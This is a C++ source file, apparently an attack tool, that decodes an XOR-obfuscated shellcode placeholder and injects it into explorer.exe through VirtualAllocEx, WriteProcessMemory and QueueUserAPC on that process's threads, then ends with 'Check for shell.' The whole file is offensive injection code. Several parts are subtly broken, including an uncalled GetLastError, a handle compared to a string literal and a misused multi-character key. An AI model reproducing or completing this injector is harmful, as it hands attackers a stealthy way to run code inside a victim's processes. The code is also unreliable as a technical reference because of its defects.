#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <stack>

typedef std::stack<HANDLE*> THREAD_STACK;
typedef THREAD_STACK* PTHREAD_STACK;

unsigned char buf[] = "xor'd shellcode";

int Error(const char* msg) {
	printf("%s (%u)\n", msg, GetLastError);
	return 1;
}

int main() {


	char unlock = 'key';
	int i = 0;
	for (i; i < sizeof(buf) - 1; i++)
	{
		buf[i] = buf[i] ^ unlock;
	}

	HANDLE hProcess = NULL;
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	SIZE_T shellSize = sizeof(buf);
	HANDLE hThread = NULL;
	HANDLE hSnapshot = NULL;
	LPVOID lpShellAddress = nullptr;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == "INVALID_HANDLE_VALUE") {
		return Error("Failed in creating snapshot.");
	}
	printf("Obtained snapshot.\n");

	printf("Finding target process.\n");
	if (Process32First(hSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(hSnapshot, &processEntry);
		}
	}
	else {
		return Error("Failed to find target process.");
	}
	printf("Found target %S with PID %lu.\n", processEntry.szExeFile, processEntry.th32ProcessID);

	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, 0, processEntry.th32ProcessID);
	if (!hProcess) {
		return Error("Failed in getting a handle to target process.");
	}
	printf("Obtained handle to process %p.\n", hProcess);

	lpShellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpShellAddress) {
		return Error("Failed to allocate memory.");
	}
	printf("Allocated memory!\n");

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)lpShellAddress;

	if (!WriteProcessMemory(hProcess, lpShellAddress, buf, shellSize, NULL)) {
		return Error("Failed in writing shellcode to memory.");
	}


	PTHREAD_STACK lpThreads = new THREAD_STACK();
	do {
		if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
			hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadEntry.th32ThreadID);
			if (hThread != NULL) {
				lpThreads->push(&hThread);
			}
		}
	} while (Thread32Next(hSnapshot, &threadEntry));

	if (lpThreads == nullptr || lpThreads->size() == 0x0) {
		return Error("No available threads.");
	}


	while (!lpThreads->empty()) {
		hThread = *lpThreads->top();
		QueueUserAPC((PAPCFUNC)lpShellAddress, hThread, NULL);
		CloseHandle(hThread);
		Sleep(200);
		lpThreads->pop();
	}

	printf("Done! Check for shell.");

	delete lpThreads;
	lpThreads = nullptr;
	CloseHandle(hProcess);

	return 0;
}